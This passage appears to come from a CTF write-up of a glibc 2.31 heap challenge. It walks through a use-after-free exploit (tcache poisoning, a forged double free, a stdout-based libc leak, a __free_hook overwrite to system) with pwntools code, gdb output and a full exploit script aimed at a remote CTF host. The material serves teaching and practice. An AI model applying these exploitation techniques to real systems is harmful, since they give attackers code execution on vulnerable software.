As you can see, after we freed the first two chunks, the second chunk now contains a pointer to the first chunk. This means that if we try to call `malloc(0x18)` for two times, the first allocation will reuse the second chunk allocation (Because it is the HEAD of the linked list just like what is shown in the above bins linked list).


Now, remember that we have a UAF bug, where we can modify the chunk stored value even though it has been freed, and our goal is to create a chunk that points to the other chunk’s metadata. With the UAF bug, we actually can increase the stored value of the second chunk by 0x10. Let’s try to do that


```
1
2
3

```


```
# Poison the tcache so that the freed linked list points
# to the chunks[1] metadata.
inc_val(1, p64(0x10))

```


Below is the gdb result after we use the UAF bug:


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11

```


```
pwndbg> x/30gx 0x55555555c290
0x55555555c290:	0x0000000000000000	0x0000000000000021
0x55555555c2a0:	0x0000000000000000	0x000055555555c010
0x55555555c2b0:	0x0000000000000000	0x0000000000000021
0x55555555c2c0:	0x000055555555c2b0	0x000055555555c010
0x55555555c2d0:	0x0000000000000000	0x0000000000000021
0x55555555c2e0:	0x0000000000000000	0x0000000000000000
...
pwndbg> bins
tcachebins
0x20 [  2]: 0x55555555c2c0 —▸ 0x55555555c2b0 ◂— 0x0

```


As you can see, now, we successfully poisoned the tcache linked list, so that it points to a chunk metadata. Now, if we try to create two new hieroglyph, the last created hieroglyph will be located in the address `0x55555555c2b0`, which is the chunk `0x55555555c2c0` metadata.


```
1
2
3
4
5

```


```
create() # Create chunks[3]. Because it uses tcache, so basically chunks[3] and chunks[1] are overlapping (pointing to the same heap chunk).
create() # Create chunks[4]. Now, it points to chunks[1] and chunks[3] metadata.
inc_val(4, p64(0)+p64(0x21)) # Fix the chunks[3] metadata size to 0x21 because the metadata got nullified due to the creation before.
# Now, we have a chunk (chunks[4]) which points to other chunks metadata (chunks[1] and chunks[3]).
# We will use it later as we want to setup for other things first

```


After execute the above script, we will have two extra chunks, (`chunks[3]` and `chunks[4]`). `chunks[3]` will store the same heap chunk’s address as `chunks[1]`, because it uses `tcache` during the allocation and `chunks[1]` stored heap chunk’s address is the first entry in the `tcache[0x20]` free list. And because we poison the `tcache` freelist, after the first allocation, the second allocation will go to the poisoned value, which is the `chunks[1]` (or `chunks[3]`) metadata.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14

```


```
pwndbg> tele &chunks
00:0000│  0x555555558060 (chunks) —▸ 0x55555555c2a0 ◂— 0x0
01:0008│  0x555555558068 (chunks+8) —▸ 0x55555555c2c0 —▸ 0x55555555c2b0 ◂— 0x0
02:0010│  0x555555558070 (chunks+16) —▸ 0x55555555c2e0 ◂— 0x0
03:0018│  0x555555558078 (chunks+24) —▸ 0x55555555c2c0 —▸ 0x55555555c2b0 ◂— 0x0
04:0020│  0x555555558080 (chunks+32) —▸ 0x55555555c2b0 ◂— 0x0 // Notice that this is the chunks[1] and chunks[3] metadata address
...
pwndbg>  x/30gx 0x55555555c290
0x55555555c290:	0x0000000000000000	0x0000000000000021
0x55555555c2a0:	0x0000000000000000	0x000055555555c010
0x55555555c2b0:	0x0000000000000000	0x0000000000000000
0x55555555c2c0:	0x000055555555c2b0	0x0000000000000000
0x55555555c2d0:	0x0000000000000000	0x0000000000000021
0x55555555c2e0:	0x0000000000000000	0x0000000000000000

```


Now that we have proved that we can poisoned the tcache to any address that we want (in this case to another chunk’s metadata), we can do anything that we want as well. We will back to this `chunks` later because we need to do one more thing before forgin `chunks` metadata.


Remember that our goal in this step is to free a chunk twice, so that it resides on `tcache` and `unsorted bin`. I’ve mentioned before that there are two ways to allocate a chunk to the `unsorted bin`. For this chall, I decided to use the the second approach, where we make `tcache` bin with size larger than `0x80` to be full, so that the next freed chunk will reside in `unsorted bin`. What is the easiest way to make the bin full? In my view, the easiest way is to directly edit the `tcache` bins data structure, because I’m too lazy to call `free` 7 times.


To give you brief explanation, the `tcache` bins data structure is actually stored in the `heap` as well. It is called ``tcache_perthread_struct. The definition is like below (`libc-2.31`):


```
1
2
3
4
5

```


```
typedef struct tcache_perthread_struct
{
  uint16_t counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;

```


`counts` are array that storing the total of freed chunk with `n` size that resides in `tcache`. For example, if you have two freed chunk with size `0xa0`, then the `counts[(chunk_size-MIN_CHUNK_SIZE) // 16]` stored value will be 2 (`MIN_CHUNK_SIZE = 0x20`). Where is the address of this data structure? It always placed in the `heap_base` as the first allocated chunk during initializing a heap (You can check `gdb` if you want).


So, to fulfill the bin, I decided to do another `tcache` poisoning, so that I can allocate a chunk to the `tcache_perthread_struct`. Let’s continue our previous script:


```
1
2
3
4
5
6

```


```
# Curr condition:
# tcache[0x20] is empty
create() # Create chunks[5]
create() # Create chunks[6]
delete(2) # tcache[0x20]: 1
delete(5) # tcache[0x20]: 2

```


Let’s check the state of our program in gdb:


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31

```


```
pwndbg> tele &chunks
00:0000│  0x555555558060 (chunks) —▸ 0x55555555c2a0 ◂— 0x0
01:0008│  0x555555558068 (chunks+8) —▸ 0x55555555c2c0 —▸ 0x55555555c2b0 ◂— 0x0
02:0010│  0x555555558070 (chunks+16) —▸ 0x55555555c2e0 ◂— 0x0
03:0018│  0x555555558078 (chunks+24) —▸ 0x55555555c2c0 —▸ 0x55555555c2b0 ◂— 0x0
04:0020│  0x555555558080 (chunks+32) —▸ 0x55555555c2b0 ◂— 0x0
05:0028│  0x555555558088 (chunks+40) —▸ 0x55555555c300 —▸ 0x55555555c2e0 ◂— 0x0
06:0030│  0x555555558090 (chunks+48) —▸ 0x55555555c320 ◂— 0x0
...
pwndbg> bins
tcachebins
0x20 [  2]: 0x55555555c300 —▸ 0x55555555c2e0 ◂— 0x0
...
pwndbg> x/50gx 0x55555555c290
0x55555555c290:	0x0000000000000000	0x0000000000000021
0x55555555c2a0:	0x0000000000000000	0x000055555555c010
0x55555555c2b0:	0x0000000000000000	0x0000000000000021
0x55555555c2c0:	0x000055555555c2b0	0x0000000000000000
0x55555555c2d0:	0x0000000000000000	0x0000000000000021
0x55555555c2e0:	0x0000000000000000	0x000055555555c010
0x55555555c2f0:	0x0000000000000000	0x0000000000000021
0x55555555c300:	0x000055555555c2e0	0x000055555555c010
0x55555555c310:	0x0000000000000000	0x0000000000000021
0x55555555c320:	0x0000000000000000	0x0000000000000000
...
pwndbg> tcache
tcache is pointing to: 0x55555555c010 for thread 1
{
  counts = {2, 0 <repeats 63 times>},
  entries = {0x55555555c300, 0x0 <repeats 63 times>}
}

```


As you can see, `chunks[5]` resides in `0x55555555c300`, where the `tcache` pointer value is `0x000055555555c2e0`. We want to poison it to point to `tcache_perthread_struct.counts`, which is in `0x000055555555c010` (`heap_base+0x10`). So, with the `UAF`, subtract it value with `0x2d0`, and then we will be able to have a chunk resides in the `tcache_perthread_struct.counts`


```
1
2
3
4

```


```
inc_val(5, p64(0xffffffffffffffff-(0x2d0-1))) # Subtract the value of chunks[5] freelist pointer by 0x2d0
# Now, the freelist pointer will point to the tcache_perthread_struct.counts
create() # Create chunks[7]
create() # Create chunks[8]. Now, it points to tcache_perthread_struct.counts

```


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10

```


```
pwndbg> tele &chunks
00:0000│  0x555555558060 (chunks) —▸ 0x55555555c2a0 ◂— 0x0
01:0008│  0x555555558068 (chunks+8) —▸ 0x55555555c2c0 —▸ 0x55555555c2b0 ◂— 0x0
02:0010│  0x555555558070 (chunks+16) —▸ 0x55555555c2e0 ◂— 0x0
03:0018│  0x555555558078 (chunks+24) —▸ 0x55555555c2c0 —▸ 0x55555555c2b0 ◂— 0x0
04:0020│  0x555555558080 (chunks+32) —▸ 0x55555555c2b0 ◂— 0x0
05:0028│  0x555555558088 (chunks+40) —▸ 0x55555555c300 —▸ 0x55555555c010 ◂— 0x0
06:0030│  0x555555558090 (chunks+48) —▸ 0x55555555c320 ◂— 0x0
07:0038│  0x555555558098 (chunks+56) —▸ 0x55555555c300 —▸ 0x55555555c010 ◂— 0x0
08:0040│  0x5555555580a0 (chunks+64) —▸ 0x55555555c010 ◂— 0x0

```


Notice that the `chunks[8]` points to the same address as `tcache_perthread_struct.counts`, which mean, by modifying the value of `chunks[8]`, we technically modify the `tcache` bins counts as well.


In this case, I want to free a chunk with size `0xa0` (it just my preference to use `0xa0` as the size, but you’re free to use other size) so that it goes to `unsorted bin`. That means, I need to set the `counts[(0xa0-0x20) // 16] = counts[8]` to 7.


```
1

```


```
inc_val(8, p64(0)+p64(0)+p64(0x7)) # Set tcache_perthread_struct.counts[(0xa1-0x20-1) // 16] to 0x7

```


```
1
2
3
4

```


```
pwndbg> bins
tcachebins
0x20 [  0]: 0x1
0xa0 [  7]: 0x0

```


As you can see, we have successfully forged the tcachebins counts of `0xa0` to full. Now, if we free a chunk with size `0xa0`, it will go to `unsorted bin`.


However, remember that the `create` function can only allocate a chunk with size `0x18`. This is the time where we will use the `chunks[4]` that we have poisoned before. Remember that `chunks[4]` points to the metadata of `chunks[1]` and `chunks[3]`. By modifying the `chunks[4]` value, we can forge the size of `chunks[1]` and `chunks[3]` to any size that we want.


Our target is to trigger the double free, where the first free will make the `chunk` go to `tcache`, while the second free will make the `chunk` go to `unsorted bin`. Before freeing the `chunks[1]`, let’s start by allocating some chunks to ensure the double free process will go smooth. The most crucial thing is before we free our fake chunk `0xa0`, we need to ensure that the `fake_chunks+0xa0` is a valid heap chunk as well. That’s why we will allocate some chunks first before starting to trigger the double free.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14

```


```
# Create two more chunks, because we will change the size of chunks[1] size to 0xa0, that means
# chunks[1]+0xa0 is required to be a valid heap chunk as well (which in this case, chunks[10]
# resides in chunks[1]+0xa0 based on observation in gdb). If we don't have chunks[10], it will trigger
# `double free or corruption (!prev)` error.
create() # Create chunks[9]
create() # Create chunks[10]

# Create 5 more chunks just to be safe, because we will mess up the heap bins, so better
# to allocate more now.
create() # Create chunks[11]
create() # Create chunks[12]
create() # Create chunks[13]
create() # Create chunks[14]
create() # Create chunks[15]

```


Let’s take a look on the gdb to ensure that `chunks[1]+0xa0` is indeed a valid chunk


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13

```


```
pwndbg> x/30gx 0x55555555c2b0
0x55555555c2b0:	0x0000000000000000	0x0000000000000021 // This is chunks[1]. We will change this to 0xa1
0x55555555c2c0:	0x000055555555c2b0	0x0000000000000000
0x55555555c2d0:	0x0000000000000000	0x0000000000000021
0x55555555c2e0:	0x0000000000000000	0x000055555555c010
0x55555555c2f0:	0x0000000000000000	0x0000000000000021
0x55555555c300:	0x000055555555c010	0x0000000000000000
0x55555555c310:	0x0000000000000000	0x0000000000000021
0x55555555c320:	0x0000000000000000	0x0000000000000000
0x55555555c330:	0x0000000000000000	0x0000000000000021
0x55555555c340:	0x0000000000000000	0x0000000000000000
0x55555555c350:	0x0000000000000000	0x0000000000000021 // This is chunks[10], which is chunks[1]+0xa0. This will make the process of freeing our fake chunks[1] smooth later.
0x55555555c360:	0x0000000000000000	0x0000000000000000

```


Now, we’re ready to trigger the double free.


```
1
2
3
4
5
6
7
8

```


```
delete(10)
delete(1) # Doesn't matter, you can free either 1 or 3 because they're the same chunks.
# Now, the tcache[0x20] freelist is chunks[1] -> chunks[10]

inc_val(4, p64(0)+p64(0x80)) # Update size to 0xa1 (0x21 + 0x80)
delete(1) # Will go to unsorted bin
# Now, chunks[1] reside in tcache[0x20] and unsorted bin :)
# The tcache[0x20] freelist is now chunks[1] -> main_arena+96

```


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11

```


```
pwndbg> bins
tcachebins
0x20 [  2]: 0x55555555c2c0 —▸ 0x7ffff7fc1be0 (main_arena+96) —▸ 0x55555555c410 ◂— ...
0xa0 [  7]: 0x0
...
unsortedbin
all: 0x55555555c2b0 —▸ 0x7ffff7fc1be0 (main_arena+96) ◂— 0x55555555c2b0
...
pwndbg> x/20gx 0x55555555c2b0
0x55555555c2b0:	0x0000000000000000	0x00000000000000a1
0x55555555c2c0:	0x00007ffff7fc1be0	0x00007ffff7fc1be0

```


Finally, we’re able to double free a chunk, so that we have a valid tcache freed chunk with pointer pointing to the libc area. It’s time to move to the next step, which is getting a libc leak via `stdout`


#### Getting a libc leak via `_IO_2_1_stdout_`


As we mentioned before, once we have poisoned the tcache to points to a libc address, to get a libc leak, we need to point it to `_IO_2_1_stdout_`, so that we can:


- Overwrite `_IO_2_1_stdout_->flags` with `0x1800`

- Overwrite `_IO_2_1_stdout_->_IO_write_ptr` to be larger than `_IO_2_1_stdout_->_IO_write_base`.


            *Note*


            If you want to understand why we can do that to get a libc leak, read my other blog post that explains about it.


First, let’s start by modifying the `tcache` freelist pointer with the `math` function, so that we will have a chunk pointing to the `_IO_2_1_stdout_`.


```
1
2
3

```


```
inc_val(1, p64(0xac0)) # Forge to _IO_2_1_stdout_._flags (main_arena+_96+0xac0 == _IO_2_1_stdout_ address)
create() # Create chunks[16]
create() # Create chunks[17]

```


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19

```


```
pwndbg> tele &chunks
00:0000│  0x555555558060 (chunks) —▸ 0x55555555c2a0 ◂— 0x0
01:0008│  0x555555558068 (chunks+8) —▸ 0x55555555c2c0 —▸ 0x7ffff7fc26a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
02:0010│  0x555555558070 (chunks+16) —▸ 0x55555555c2e0 ◂— 0x0
03:0018│  0x555555558078 (chunks+24) —▸ 0x55555555c2c0 —▸ 0x7ffff7fc26a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
04:0020│  0x555555558080 (chunks+32) —▸ 0x55555555c2b0 ◂— 0x0
05:0028│  0x555555558088 (chunks+40) —▸ 0x55555555c300 —▸ 0x55555555c010 ◂— 0x0
06:0030│  0x555555558090 (chunks+48) —▸ 0x55555555c320 ◂— 0x0
07:0038│  0x555555558098 (chunks+56) —▸ 0x55555555c300 —▸ 0x55555555c010 ◂— 0x0
08:0040│  0x5555555580a0 (chunks+64) —▸ 0x55555555c010 ◂— 0x0
09:0048│  0x5555555580a8 (chunks+72) —▸ 0x55555555c340 ◂— 0x0
0a:0050│  0x5555555580b0 (chunks+80) —▸ 0x55555555c360 ◂— 0x1
0b:0058│  0x5555555580b8 (chunks+88) —▸ 0x55555555c380 ◂— 0x0
0c:0060│  0x5555555580c0 (chunks+96) —▸ 0x55555555c3a0 ◂— 0x0
0d:0068│  0x5555555580c8 (chunks+104) —▸ 0x55555555c3c0 ◂— 0x0
0e:0070│  0x5555555580d0 (chunks+112) —▸ 0x55555555c3e0 ◂— 0x0
0f:0078│  0x5555555580d8 (chunks+120) —▸ 0x55555555c400 ◂— 0x0
10:0080│  0x5555555580e0 (chunks+128) —▸ 0x55555555c2c0 —▸ 0x7ffff7fc26a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
11:0088│  0x5555555580e8 (chunks+136) —▸ 0x7ffff7fc26a0 (_IO_2_1_stdout_) ◂— 0xfbad2887

```


Notice that `chunks[17]` is now pointing to the `_IO_2_1_stdout_`. First, let’s start by overwriting the `_IO_2_1_stdout_->flags` to `0x1800`. Let’s check the current `flags` value in gdb.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16

```


```
pwndbg> print _IO_2_1_stdout_
$1 = {
  file = {
    _flags = -72537977,
    _IO_read_ptr = 0x7ffff7fc2723 <_IO_2_1_stdout_+131> "\n",
    _IO_read_end = 0x7ffff7fc2723 <_IO_2_1_stdout_+131> "\n",
    _IO_read_base = 0x7ffff7fc2723 <_IO_2_1_stdout_+131> "\n",
    _IO_write_base = 0x7ffff7fc2723 <_IO_2_1_stdout_+131> "\n",
    _IO_write_ptr = 0x7ffff7fc2723 <_IO_2_1_stdout_+131> "\n",
...
pwndbg> x/10gx &_IO_2_1_stdout_
0x7ffff7fc26a0 <_IO_2_1_stdout_>:	0x00000000fbad2887	0x00007ffff7fc2723
0x7ffff7fc26b0 <_IO_2_1_stdout_+16>:	0x00007ffff7fc2723	0x00007ffff7fc2723
0x7ffff7fc26c0 <_IO_2_1_stdout_+32>:	0x00007ffff7fc2723	0x00007ffff7fc2723
0x7ffff7fc26d0 <_IO_2_1_stdout_+48>:	0x00007ffff7fc2723	0x00007ffff7fc2723
0x7ffff7fc26e0 <_IO_2_1_stdout_+64>:	0x00007ffff7fc2724	0x0000000000000000

```


So, the current value is `0x00000000fbad2887`. We need to make it to `0x1800`, so we need to decrease it.


```
1

```


```
inc_val(17, p64(0xffffffffffffffff-(0xfbad2887-1) + 0x1800)) # Subtract the _flags value to be 0x1800

```


```
1
2
3
4
5
6

```


```
pwndbg> x/10gx &_IO_2_1_stdout_
0x7ffff7fc26a0 <_IO_2_1_stdout_>:	0x0000000000001800	0x00007ffff7fc2723
0x7ffff7fc26b0 <_IO_2_1_stdout_+16>:	0x00007ffff7fc2723	0x00007ffff7fc2723
0x7ffff7fc26c0 <_IO_2_1_stdout_+32>:	0x00007ffff7fc2723	0x00007ffff7fc2724
0x7ffff7fc26d0 <_IO_2_1_stdout_+48>:	0x00007ffff7fc2724	0x00007ffff7fc2723
0x7ffff7fc26e0 <_IO_2_1_stdout_+64>:	0x00007ffff7fc2724	0x0000000000000000

```


Now that the flag is `0x1800`, we need to modify the `_IO_write_ptr`. We can simply do tcache poisoning again to allocate a chunk to the `_IO_2_1_stdout_->_IO_write_ptr`.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14

```


```
delete(11) # Free chunks[11]
delete(12) # Free chunks[12]. Now, tcache[0x20]: 2 with freelist chunks[12] -> chunks[11]
inc_val(8, p64(0x1)) # Increase tcache_perthread_struct.counts[0] by 1, so that tcache[0x20]:3
inc_val(12, p64(0xffffffffffffffff-(0xc0-1))) # Modify chunks[12] freelist pointer to point to chunks[1]
# Now, freelist pointer of tcache[0x20]: chunk[12] -> chunks[1] -> _IO_2_1_stdout
# (Remember that chunks[1] still contains libc address of _IO_2_1_stdout_ due to the previous poisoning)

inc_val(1, p64(0x28)) # Forge it to point to _IO_2_1_stdout_->_IO_write_ptr
# Now, freelist pointer of tcache[0x20]: chunk[12] -> chunks[1] -> _IO_2_1_stdout

create() # Create chunks[18]
create() # Create chunks[19]
create() # Create chunks[20]
# Now, chunks[20] points to _IO_2_1_stdout_ -> _IO_write_ptr

```


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22

```


```
pwndbg> tele &chunks 25
00:0000│  0x555555558060 (chunks) —▸ 0x55555555c2a0 ◂— 0x0
01:0008│  0x555555558068 (chunks+8) —▸ 0x55555555c2c0 —▸ 0x7ffff7fc26c8 (_IO_2_1_stdout_+40) —▸ 0x7ffff7fc2724 (_IO_2_1_stdout_+132) ◂— 0xf7fc37e000000000
02:0010│  0x555555558070 (chunks+16) —▸ 0x55555555c2e0 ◂— 0x0
03:0018│  0x555555558078 (chunks+24) —▸ 0x55555555c2c0 —▸ 0x7ffff7fc26c8 (_IO_2_1_stdout_+40) —▸ 0x7ffff7fc2724 (_IO_2_1_stdout_+132) ◂— 0xf7fc37e000000000
04:0020│  0x555555558080 (chunks+32) —▸ 0x55555555c2b0 ◂— 0x0
05:0028│  0x555555558088 (chunks+40) —▸ 0x55555555c300 —▸ 0x55555555c010 ◂— 0x0
06:0030│  0x555555558090 (chunks+48) —▸ 0x55555555c320 ◂— 0x0
07:0038│  0x555555558098 (chunks+56) —▸ 0x55555555c300 —▸ 0x55555555c010 ◂— 0x0
08:0040│  0x5555555580a0 (chunks+64) —▸ 0x55555555c010 ◂— 0x0
09:0048│  0x5555555580a8 (chunks+72) —▸ 0x55555555c340 ◂— 0x0
0a:0050│  0x5555555580b0 (chunks+80) —▸ 0x55555555c360 ◂— 0x1
0b:0058│  0x5555555580b8 (chunks+88) —▸ 0x55555555c380 ◂— 0xfbad2887
0c:0060│  0x5555555580c0 (chunks+96) —▸ 0x55555555c3a0 —▸ 0x55555555c2c0 —▸ 0x7ffff7fc26c8 (_IO_2_1_stdout_+40) —▸ 0x7ffff7fc2724 (_IO_2_1_stdout_+132) ◂— ...
0d:0068│  0x5555555580c8 (chunks+104) —▸ 0x55555555c3c0 ◂— 0x0
0e:0070│  0x5555555580d0 (chunks+112) —▸ 0x55555555c3e0 ◂— 0x0
0f:0078│  0x5555555580d8 (chunks+120) —▸ 0x55555555c400 ◂— 0x0
10:0080│  0x5555555580e0 (chunks+128) —▸ 0x55555555c2c0 —▸ 0x7ffff7fc26c8 (_IO_2_1_stdout_+40) —▸ 0x7ffff7fc2724 (_IO_2_1_stdout_+132) ◂— 0xf7fc37e000000000
11:0088│  0x5555555580e8 (chunks+136) —▸ 0x7ffff7fc26a0 (_IO_2_1_stdout_) ◂— 0x1800
12:0090│  0x5555555580f0 (chunks+144) —▸ 0x55555555c3a0 —▸ 0x55555555c2c0 —▸ 0x7ffff7fc26c8 (_IO_2_1_stdout_+40) —▸ 0x7ffff7fc2724 (_IO_2_1_stdout_+132) ◂— ...
13:0098│  0x5555555580f8 (chunks+152) —▸ 0x55555555c2c0 —▸ 0x7ffff7fc26c8 (_IO_2_1_stdout_+40) —▸ 0x7ffff7fc2724 (_IO_2_1_stdout_+132) ◂— 0xf7fc37e000000000
14:00a0│  0x555555558100 (chunks+160) —▸ 0x7ffff7fc26c8 (_IO_2_1_stdout_+40) —▸ 0x7ffff7fc2724 (_IO_2_1_stdout_+132) ◂— 0xf7fc37e000000000

```


As you can see, `chunks[20]` is now pointing to `_IO_2_1_stdout_->_IO_write_ptr`. It’s time to increase the value to leak some libc addresses.


```
1
2
3
4
5
6
7

```


```
# Increase its value by 0x30. Now, when the binary called `puts`, it will leak some
# Libc address, which is based on observation is _IO_stdfile_1_lock
inc_val(20, p64(0x30))
r.recv(5)
leaked_libc = u64(r.recv(6).ljust(8, b'\x00'))
libc.address = leaked_libc - libc.symbols['_IO_stdfile_1_lock']
log.info(f'Libc base: {hex(libc.address)}')

```


```
1

```


```
[*] Libc base: 0x7ffff7dd5000

```


Now that we’ve got a libc leak, we can continue to the next step


#### Gain Remote Code Execution


Because it used `libc-2.31`, we can simply overwrite `__free_hook` to `system`, and then call `free("/bin/sh")`, which is equivalent to `system("/bin/sh")`. We simply repeat the previous method that we did to allocate a chunk to `_IO_2_1_stdout_->_IO_write_ptr`.


```
 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22

```


```
delete(13)
delete(14)
# Based on observation in GDB, due to the previous poisoning dirty data, when we free
# chunks[13], the pointer value will be initialized with _IO_2_1_stdout_+132 directly
# So, freelist = chunks[14] -> chunks[13] -> _IO_2_1_stdout_+132, tcache[0x20]: 2

inc_val(8, p64(0x1)) # Increase tcache_perthread_struct.counts[0] by 1, so that tcache[0x20]:3
inc_val(13, p64(0x1724)) # Increase the freelist pointer by 0x1724, so that i points to __free_hook
create() # Create chunks[21]
create() # Create chunks[22]
create() # Create chunks[23]
# Now, chunks[23] points to __free_hook

# Modify chunks[0] to "/bin/sh"
inc_val(0, b'/bin/sh\x00')

# Modify __free_hook to system
inc_val(23, p64(libc.symbols['system']))

# free("/bin/sh") :)
delete(0)
r.interactive()

```


And finally, we got a shell :D. Let’s grab the flag!


![https://i.imgur.com/3vZpqhG.png](images/img_7.svg)


#### Full Script


Below is my full script:


```
  1
  2
  3
  4
  5
  6
  7
  8
  9
 10
 11
 12
 13
 14
 15
 16
 17
 18
 19
 20
 21
 22
 23
 24
 25
 26
 27
 28
 29
 30
 31
 32
 33
 34
 35
 36
 37
 38
 39
 40
 41
 42
 43
 44
 45
 46
 47
 48
 49
 50
 51
 52
 53
 54
 55
 56
 57
 58
 59
 60
 61
 62
 63
 64
 65
 66
 67
 68
 69
 70
 71
 72
 73
 74
 75
 76
 77
 78
 79
 80
 81
 82
 83
 84
 85
 86
 87
 88
 89
 90
 91
 92
 93
 94
 95
 96
 97
 98
 99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199

```


```
'''
Cheatsheet:
one_gadget <libc_file>
ROPgadget --binary <binary_file>
readelf -s <libc_file> | grep <something>
readelf --sections <binary_file> | egrep "Name|.rela.plt|.dynsym|.dynstr"
rsactftool -n <modulus> -e <exponent> --private
pwninit <- patch ELF with the correct libc

libc = ELF(libc_path)
read_got = exe.got['read']
read_plt = exe.plt['read']
libc_system = libc.symbols['system']
bin_sh_string_addr = next(libc.search(b'/bin/sh'))
bss = elf.bss()
sc = asm(shellcraft.amd64.linux.sh())
libcdb.unstrip_libc('./libc-2.31.so')

from pwn import *
kernel = ELF('./vmlinux')
hex(next(kernel.search(b'/sbin/modprobe\0')))

unsorted_bin > fastbin

https://stackoverflow.com/questions/60729616/segfault-in-ret2libc-attack-but-not-hardcoded-system-call

pub = RSA.importKey(open("pub.pem", "rb").read(), passphrase=None)
e = pub.e
n = pub.n
'''
from Crypto.Cipher import AES, PKCS1_OAEP, PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad
from Crypto.Hash import SHA3_256, HMAC, BLAKE2s
from Crypto.Util.number import *
import glob, gmpy2, pickle, itertools, sys, json, hashlib, os, math, time, base64, binascii, string, re, struct, datetime, subprocess
from base64 import b64encode, b64decode
from pwn import p64, u64, p32, u32
from pwn import *

exe = ELF("math-door_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe
context.arch = 'amd64'
context.encoding = 'latin'
context.log_level = 'INFO'
warnings.simplefilter("ignore")

remote_url = "209.97.134.50"
remote_port = 32674
gdbscript = '''
'''

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.PLT_DEBUG:
            # gdb.attach(r, gdbscript=gdbscript)
            pause()
    else:
        r = remote(remote_url, remote_port)

    return r

def demangle(val, is_heap_base=False):
    if not is_heap_base:
        mask = 0xfff << 52
        while mask:
            v = val & mask
            val ^= (v >> 12)
            mask >>= 12
        return val
    return val << 12

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

r = conn()

def create():
    r.sendlineafter(b'Action: ', b'1')

def delete(idx):
    r.sendlineafter(b'Action: ', b'2')
    r.sendlineafter(b'index:', str(idx).encode())

def inc_val(idx, val):
    r.sendlineafter(b'Action: ', b'3')
    r.sendlineafter(b'index:', str(idx).encode())
    r.sendafter(b'hieroglyph:', val.ljust(0x18, b'\x00'))

# Create three chunks (0, 1, 2)
for _ in range(3):
    create()
# Free the first two chunks
delete(0) # Delete chunks[0]
delete(1) # Delete chunks[1]

# Poison the tcache so that the freed linked list points
# to the chunks[1] metadata.
inc_val(1, p64(0x10))

create() # Create chunks[3]. Because it uses tcache, so basically chunks[3] and chunks[1] are overlapping (pointing to the same heap chunk).
create() # Create chunks[4]. Now, it points to chunks[1] and chunks[3] metadata.
inc_val(4, p64(0)+p64(0x21)) # Fix the chunks[3] metadata size to 0x21 because the metadata got nullified due to the creation before.
# Now, we have a chunk (chunks[4]) which points to other chunks metadata (chunks[1] and chunks[3]).
# We will use it later as we want to setup for other things first

# Curr condition:
# tcache[0x20] is empty
create() # Create chunks[5]
create() # Create chunks[6]
delete(2) # tcache[0x20]: 1
delete(5) # tcache[0x20]: 2
inc_val(5, p64(0xffffffffffffffff-(0x2d0-1))) # Subtract the value of chunks[5] freelist pointer by 0x2d0
# Now, the freelist pointer will point to the tcache_perthread_struct.counts
create() # Create chunks[7]
create() # Create chunks[8]. Now, it points to tcache_perthread_struct.counts
inc_val(8, p64(0)+p64(0)+p64(0x7)) # Set tcache_perthread_struct.counts[(0xa1-0x20-1) // 16] to 0x7

# Create two more chunks, because we will change the size of chunks[1] size to 0xa0, that means
# chunks[1]+0xa0 is required to be a valid heap chunk as well (which in this case, chunks[10]
# resides in chunks[1]+0xa0 based on observation in gdb). If we don't have chunks[10], it will trigger
# `double free or corruption (!prev)` error.
create() # Create chunks[9]
create() # Create chunks[10]
# pause()

# Create 5 more chunks just to be safe, because we will mess up the heap bins, so better
# to allocate more now.
create() # Create chunks[11]
create() # Create chunks[12]
create() # Create chunks[13]
create() # Create chunks[14]
create() # Create chunks[15]
# pause()

delete(10)
delete(1) # Doesn't matter, you can free either 1 or 3 because they're the same chunks.
# Now, the tcache[0x20] freelist is chunks[1] -> chunks[10]

inc_val(4, p64(0)+p64(0x80)) # Update size to 0xa1 (0x21 + 0x80)
delete(1) # Will go to unsorted bin
# Now, chunks[1] reside in tcache[0x20] and unsorted bin :)
# The tcache[0x20] freelist is now chunks[1] -> main_arena+96

inc_val(1, p64(0xac0)) # Forge to _IO_2_1_stdout_._flags
create() # Create chunks[16]
create() # Create chunks[17]

inc_val(17, p64(0xffffffffffffffff-(0xfbad2887-1) + 0x1800)) # Subtract the _flags value to be 0x1800

delete(11) # Free chunks[11]
delete(12) # Free chunks[12]. Now, tcache[0x20]: 2
inc_val(8, p64(0x1)) # Increase tcache_perthread_struct.counts[0] by 1, so that tcache[0x20]:3
inc_val(12, p64(0xffffffffffffffff-(0xc0-1))) # Modify chunks[12] freelist pointer to point to chunks[1]
# Now, freelist pointer of tcache[0x20]: chunk[12] -> chunks[1] -> _IO_2_1_stdout
# (Remember that chunks[1] still contains libc address of _IO_2_1_stdout_ due to the previous poisoning)

